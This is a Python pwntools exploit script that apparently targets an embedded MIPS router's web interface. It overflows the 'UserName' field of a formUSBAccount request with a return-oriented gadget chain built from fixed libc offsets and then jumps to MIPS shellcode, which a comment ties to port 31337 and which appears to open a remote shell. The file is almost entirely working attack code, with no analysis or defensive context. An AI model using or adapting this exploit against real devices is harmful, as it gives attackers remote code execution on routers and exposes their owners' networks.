import struct
import requests
import urllib
import socket

from pwn import *

context(arch='mips', bits=32, endian='little')

session = requests.Session()
session.verify = False

headers = {
    'Host': '192.168.2.1',
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
    'Origin': 'http://192.168.2.1',
    'Referer': 'http://192.168.2.1/probe.asp',
    # 'Content-Type': 'application/x-www-form-urlencoded',
}

sleep_addr = 0x000529a0
usleep_addr = 0x00052bb0
libc_base = 0x77ebf000

"""
ip: 192.168.2.1
port : 31337
"""
shellcode  = b"\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28"
shellcode += b"\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
shellcode += b"\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
shellcode += b"\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01"
shellcode += b"\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24"
shellcode += b"\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20"
shellcode += b"\xf8\xff\xa5\xaf\x02\x02\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"
shellcode += b"\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"
shellcode += b"\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"
shellcode += b"\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"
shellcode += b"\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"
shellcode += b"\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"
shellcode += b"\xab\x0f\x02\x24\x0c\x09\x09\x01"


"""
    addiu $t9,$sp,0x104
    jalr $t9
    li $v0,0xfffffffc
"""
myjump_to_shellcode  = b"\x04\x01\xb9\x27"
myjump_to_shellcode += b"\x09\xf8\x20\x03"
myjump_to_shellcode += b"\xfc\xff\x02\x24"


"""
jump to sleep and set $ra
.text:0001B0B4 21 C8 20 02                   move    $t9, $s1
.text:0001B0B8 20 00 BF 8F                   lw      $ra, 0x18+0x8($sp)
.text:0001B0BC 1C 00 B1 8F                   lw      $s1, 0x18+0x4($sp)
.text:0001B0C0 18 00 B0 8F                   lw      $s0, 0x18+0x0($sp)
.text:0001B0C4 08 00 20 03                   jr      $t9
.text:0001B0C8 28 00 BD 27                   addiu   $sp, 0x28
"""
middle_jump = 0x0001b0b4


"""
.text:00035C24 21 C8 40 02                   move    $t9, $s2
.text:00035C28 09 F8 20 03                   jalr    $t9
.text:00035C2C 21 20 00 02                   move    $a0, $s0
"""
move_a0_s0 = 0x00035c24

"""
.text:00026164 18 00 A5 27                   addiu   $a1, $sp, 0xC0-0xA8
.text:00026168 10 00 BC 8F                   lw      $gp, 0xC0-0xB0($sp)
.text:0002616C 21 90 40 00                   move    $s2, $v0
.text:00026174 D4 00 BF 8F                   lw      $ra, 0xC0+var_s14($sp)
.text:00026178 D0 00 B4 8F                   lw      $s4, 0xC0+var_s10($sp)
.text:0002617C CC 00 B3 8F                   lw      $s3, 0xC0+var_sC($sp)
.text:00026180 C8 00 B2 8F                   lw      $s2, 0xC0+var_s8($sp)
.text:00026184 C4 00 B1 8F                   lw      $s1, 0xC0+var_s4($sp)
.text:00026188 C0 00 B0 8F                   lw      $s0, 0xC0+var_s0($sp)
.text:0002618C 21 10 60 00                   move    $v0, $v1
.text:00026190 08 00 E0 03                   jr      $ra
.text:00026194 D8 00 BD 27                   addiu   $sp, 0xD8
"""
addiu_a1_sp = 0x00026164

"""
.text:00020B3C 21 C8 A0 00                   move    $t9, $a1
.text:00020B40 21 28 C0 00                   move    $a1, $a2
.text:00020B44 08 00 20 03                   jr      $t9
.text:00020B48 08 00 84 24                   addiu   $a0, 8
"""
move_t9_a1 = 0x00020b3c

"""
.text:0004FEC4 21 C8 40 00                   move    $t9, $v0
.text:0004FEC8 09 F8 20 03                   jalr    $t9 ; setresuid
.text:0004FECC 00 00 00 00                   nop
"""
move_t9_v0 = 0x0004fec4

############### exploit ##############
payload  = b'A'*0x98 + p32(0x01010101)                # $s0 = usleep arg
payload += p32(usleep_addr + libc_base)               # $s1 = usleep address
payload += p32(middle_jump + libc_base)               # $s2 = middle jump
payload += b'A'*0x18 + p32(move_a0_s0 + libc_base)    # $ra = 

############## get stack address #############
payload += b'B'*0x20                                  # padding
payload += p32(addiu_a1_sp + libc_base)               # $s0
payload += p32(sleep_addr+libc_base)                  # $ra

#############  #####################
payload += b'C' * 24
payload += myjump_to_shellcode
payload += b'C' * (212 - 24 - 12)

############## 
payload += p32(move_t9_a1 + libc_base)
payload += b'D' * 0x104
payload += shellcode


param1s = {
    'editFolder': 1,
    'UserName': payload,
}

r = requests.post(url='http://192.168.2.1/goform/formUSBAccount', data=param1s, headers=headers)
print(f"r.status_code ======> {r.status_code}")

